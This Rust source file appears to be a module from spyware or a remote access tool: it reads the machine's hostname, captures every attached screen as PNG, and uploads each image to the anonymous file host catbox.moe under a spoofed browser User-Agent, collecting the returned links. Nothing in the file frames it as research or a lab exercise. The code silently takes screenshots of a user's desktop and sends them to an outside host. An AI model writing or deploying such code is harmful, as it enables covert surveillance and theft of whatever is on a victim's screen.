use reqwest::multipart;
use screenshots::Screen;
use std::ffi::OsString;
use std::io::Cursor;

pub fn get_host() -> OsString {
    return gethostname::gethostname();
}

pub async fn screenshot_desktop_and_upload() -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let screens = Screen::all()?;

    let client = reqwest::Client::builder()
        .http1_only()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .build()?;

    let mut urls = Vec::new();

    for screen in screens {
        let image = screen.capture()?;
        let mut png_bytes: Vec<u8> = Vec::new();

        image.write_to(
            &mut Cursor::new(&mut png_bytes),
            screenshots::image::ImageFormat::Png,
        )?;

        if png_bytes.is_empty() {
            continue;
        }

        let form = multipart::Form::new().text("reqtype", "fileupload").part(
            "fileToUpload",
            multipart::Part::bytes(png_bytes)
                .file_name("screenshot.png")
                .mime_str("image/png")?,
        );

        let resp = client
            .post("https://catbox.moe/user/api.php")
            .multipart(form)
            .send()
            .await?;

        let status = resp.status();
        let text = resp.text().await?;

        if status.is_success() && !text.is_empty() {
            urls.push(text.trim().to_string());
        } else {
            return Err(format!("Upload failed: {} - {}", status, text).into());
        }
    }

    Ok(urls)
}
